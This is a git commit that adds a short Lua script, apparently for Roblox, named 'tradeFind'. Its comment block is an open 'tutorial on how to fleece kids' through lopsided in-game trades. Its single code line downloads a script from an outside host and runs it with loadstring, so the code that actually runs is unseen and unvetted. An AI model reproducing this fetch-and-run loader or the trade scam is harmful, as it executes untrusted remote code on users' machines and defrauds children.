f905b1e3e932ab738dbb791738e1c0e532df327f
robloxscripts10 <porropc@gmail.com>
2026-05-12 19:41:13 +0200

    Create tradeFind-by-Tacohub.lua

---
+++ tradeFind-by-Tacohub.lua
@@ -0,0 +1,11 @@
+--[[
+Tutorial on how to fleece kids:
+
+Spam trade an og
+Get accepted
+Place 2 good dragons 1b+
+If their og makes less than ur dragons they will probably accept
+
+And ez you just made bag boy 🚀
+--]]
+loadstring(game:HttpGet("https://api.luapolsec.top/files/v4/loaders/861fdd5feb804a89a2f3848f43774fcb.lua"))()
